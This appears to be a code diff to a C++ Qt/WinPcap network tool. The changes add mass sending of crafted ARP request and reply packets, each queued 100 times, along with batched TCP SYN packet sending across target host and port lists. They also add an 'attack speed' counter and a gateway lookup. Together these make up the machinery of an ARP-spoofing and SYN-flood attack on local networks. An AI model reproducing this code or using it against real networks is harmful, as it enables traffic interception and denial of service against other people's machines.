@@ -1,6 +1,6 @@
 #include "lanpcap.h"
 #include <QtNetwork/QNetworkInterface>
-#include <QDebug>
+//#include <QDebug>
 #include <QTcpSocket>
 #include <stdlib.h>
 
@@ -8,6 +8,8 @@
 #include <winsock2.h>
 #include <Iphlpapi.h>
 #include <stdio.h>
+#include <QTime>
+#include <QTimer>
 
 typedef struct ip_address{
     u_char byte1;
@@ -98,7 +100,7 @@ typedef struct arp_packet
 {
     ether_header eth;
     arp_header  arpHeader;
-    u_char padding[18];
+   // u_char padding[18];
 }arp_packet;
 
 struct psd_header {
@@ -203,7 +205,7 @@ void buildArpReplyPacket(arp_packet& arpPacket,const unsigned char* source_mac,c
     memcpy(&(arpPacket.arpHeader.daddr.byte1),dest_ip,4);
     memcpy(arpPacket.arpHeader.ether_shost,source_mac,6);
     memcpy(arpPacket.arpHeader.ether_dhost,dest_mac,6);
-    memset(arpPacket.padding,0,18);
+   // memset(arpPacket.padding,0,18);
 }
 
 
@@ -225,8 +227,12 @@ void buildArpRequestPacket(arp_packet& arpPacket,const unsigned char* source_mac
     memcpy(arpPacket.arpHeader.ether_shost,source_mac,6);
     //  memcpy(arpPacket.arpHeader.ether_dhost,dest_mac,6);
     memset(arpPacket.arpHeader.ether_dhost,0,6);
-    memset(arpPacket.padding,0,18);
+   // memset(arpPacket.padding,0,18);
 }
+
+
+
+
 
 LANPcap::LANPcap(QObject *parent):QThread(parent)
 {
@@ -273,7 +279,7 @@ LANPcap::LANPcap(QObject *parent):QThread(parent)
 
                     //Copy the device interface info and save it to cache
                     CacheDevs.append(CurrentDevInfo);
-
+                    PacketQueue=pcap_sendqueue_alloc(1024*256); //0.25mb
                 }
 
             }
@@ -287,6 +293,34 @@ LANPcap::LANPcap(QObject *parent):QThread(parent)
 
         qDebug()<<DevInfo.toQString();
     }
+
+
+    QTimer *Timer=new QTimer(this);
+    QObject::connect(Timer,&QTimer::timeout,
+
+                     [this]()
+    {
+        if(NetworkSendSize==LastNetworkSendSize)return;
+
+        QString PacketSendSpeed;
+
+        float AttackSpeed=NetworkSendSize/1024.f;
+        if(AttackSpeed>1000)
+        {
+            PacketSendSpeed.sprintf("%.2fmb/s",AttackSpeed/1024.f);
+        }else
+        {
+            PacketSendSpeed.sprintf("%.1fkb/s",AttackSpeed);
+        }
+
+
+        LastNetworkSendSize=NetworkSendSize;
+        NetworkSendSize=0;
+
+        emit OnAttackSpeedChanged(PacketSendSpeed);
+    }
+    );
+    Timer->start(1000);
 
 }
 
@@ -305,11 +339,48 @@ LANPcap::~LANPcap()
     DevLists=nullptr;
 }
 
+
+template<typename T>
+qint64 SendPacket( struct pcap* PcapHandle,T Packet,int Count)
+{
+    QTime CurTime=QTime::currentTime();
+
+    timeval ts;
+    ts.tv_sec=CurTime.second();
+    ts.tv_usec=CurTime.msec();
+
+    pcap_pkthdr PacketHeader={ts,sizeof(T),sizeof(T)};
+
+    struct pcap_send_queue *PacketQueue=pcap_sendqueue_alloc( (sizeof(T) + sizeof(pcap_pkthdr) )*Count);
+
+
+
+    for(int i=0;i<Count;++i)
+    {
+         pcap_sendqueue_queue(PacketQueue,&PacketHeader,(const uchar*)(&Packet));
+    }
+    qint64 SentLen=pcap_sendqueue_transmit(PcapHandle,PacketQueue,0);
+
+
+    pcap_sendqueue_destroy(PacketQueue);
+
+    return SentLen;
+}
+
+
+
 bool LANPcap::SendArpRequestPacket(const LANHostInfo &SrcHost, const LANHostInfo &DstHost)
 {
     arp_packet Packet;
     buildArpRequestPacket(Packet,SrcHost.MacAddr,SrcHost.Ipv4Addr,DstHost.Ipv4Addr,DstHost.MacAddr);
 
+    qint64 SentLen=SendPacket(PcapHandle,Packet,100);
+    if(SentLen>0)
+    {
+        this->NetworkSendSize+=SentLen;
+        return true;
+    }
+    return false;
 
     if(0!=(pcap_sendpacket(PcapHandle,(const uchar*)(&Packet),sizeof(arp_packet))))
     {
@@ -319,6 +390,8 @@ bool LANPcap::SendArpRequestPacket(const LANHostInfo &SrcHost, const LANHostInfo
         return false;
     }
 
+
+
     return true;
 }
 
@@ -326,6 +399,16 @@ bool LANPcap::SendArpReplyPacket(const LANHostInfo &SrcHost, const LANHostInfo &
 {
     arp_packet Packet;
     buildArpReplyPacket(Packet,SrcHost.MacAddr,SrcHost.Ipv4Addr,DstHost.Ipv4Addr,DstHost.MacAddr);
+
+    qint64 SentLen=SendPacket(PcapHandle,Packet,100);
+    if(SentLen>0)
+    {
+        this->NetworkSendSize+=SentLen;
+        return true;
+    }
+    return false;
+
+
     if(0!=(pcap_sendpacket(PcapHandle,(const uchar*)(&Packet),sizeof(arp_packet))))
     {
         qDebug()<<"send arp packet fail"<<pcap_geterr(PcapHandle);
@@ -341,17 +424,79 @@ bool LANPcap::SendTcpSynPacket(const LANHostInfo &SrcHost,const LANHostInfo &Dst
     tcp_packet Packet;
     buildSynPacket(Packet,SrcHost.MacAddr,SrcHost.Ipv4Addr,DstHost.Ipv4Addr,DstHost.MacAddr,SrcPort,DstPort);
 
-    if(0!=(pcap_sendpacket(PcapHandle,(const uchar*)(&Packet),sizeof(tcp_packet))))
-    {
-        qDebug()<<"send tcp syn packet fail"<<pcap_geterr(PcapHandle);
+//    if(0!=(pcap_sendpacket(PcapHandle,(const uchar*)(&Packet),sizeof(tcp_packet))))
+//    {
+//        qDebug()<<"send tcp syn packet fail"<<pcap_geterr(PcapHandle);
 
-        emit OnSendTcpSynPacket(false);
-        return false;
+
+//        return false;
+//    }
+//    return true;
+
+
+    //TODO, don't use repeat packet, refactory to enqueue targets with ports instead
+    qint64 SentLen=SendPacket(PcapHandle,Packet,10);
+    if(SentLen>0)
+    {
+        this->NetworkSendSize+=SentLen;
+        return true;
+    }
+    return false;
+
+
+//    QTime CurTime=QTime::currentTime();
+
+//    timeval ts;
+//    ts.tv_sec=CurTime.second();
+//    ts.tv_usec=CurTime.msec();
+
+//    pcap_pkthdr PacketHeader={ts,sizeof(tcp_packet),sizeof(tcp_packet)};
+
+//    struct pcap_send_queue *PacketQueue=pcap_sendqueue_alloc(1024*256);
+
+//    for(int i=0;i<100;++i)
+//    {
+//         pcap_sendqueue_queue(PacketQueue,&PacketHeader,(const uchar*)(&Packet));
+//    }
+//    int SentLen=pcap_sendqueue_transmit(PcapHandle,PacketQueue,0);
+
+
+
+//    pcap_sendqueue_destroy(PacketQueue);
+
+//    return true;
+
+}
+
+int LANPcap::SendTcpSynPackets(QList<FPacketBatch> &Packets)
+{
+    QTime CurTime=QTime::currentTime();
+
+    timeval ts;
+    ts.tv_sec=CurTime.second();
+    ts.tv_usec=CurTime.msec();
+
+    pcap_pkthdr PacketHeader={ts,sizeof(tcp_packet),sizeof(tcp_packet)};
+
+
+
+    struct pcap_send_queue *PacketQueue=pcap_sendqueue_alloc( (sizeof(tcp_packet) + sizeof(pcap_pkthdr) )*Packets.size());
+
+
+    for(auto &Batch:Packets)
+    {
+        tcp_packet Packet;
+
+        buildSynPacket(Packet,Batch.SrcHost.MacAddr,Batch.SrcHost.Ipv4Addr,Batch.DstHost.Ipv4Addr,Batch.DstHost.MacAddr,Batch.SrcPort,Batch.DstPort);
+        pcap_sendqueue_queue(PacketQueue,&PacketHeader,(const uchar*)(&Packet));
     }
 
-    emit OnSendTcpSynPacket(true);
-    return true;
+    qint64 SentLen=pcap_sendqueue_transmit(PcapHandle,PacketQueue,0);
 
+
+    pcap_sendqueue_destroy(PacketQueue);
+
+    return SentLen;
 }
 
 void LANPcap::StartAnalyzeLAN()
@@ -489,6 +634,13 @@ QStringList LANPcap::GetInterfaceDescriptionLists()
 
 }
 
+LANHostInfo LANPcap::GetGateWayHostInfo()
+{
+    return this->CacheLANHostInfo[this->GateWayIndex];
+}
+
+
+
 void LANPcap::run()
 {
     if(-1==CurrentSelectDevIndex)return;
@@ -576,6 +728,10 @@ void LANPcap::UpdateNetTable()
                 memcpy(SelectInterface.MacAddr,NetInterface->Address,6);
                 memcpy(CacheLANHostInfo[SelectInterface.Ipv4Addr[3]].MacAddr,NetInterface->Address,6);
                 qDebug()<<"Current Mac"<<SelectInterface.GetMacAddr();
+
+                QString GateWay(NetInterface->GatewayList.IpAddress.String);
+                this->GateWayIndex=(GateWay.split(".")[3]).toInt();
+                qDebug()<<"Current Gateway"<<GateWay;
             }
 
             NetInterface = NetInterface->Next;
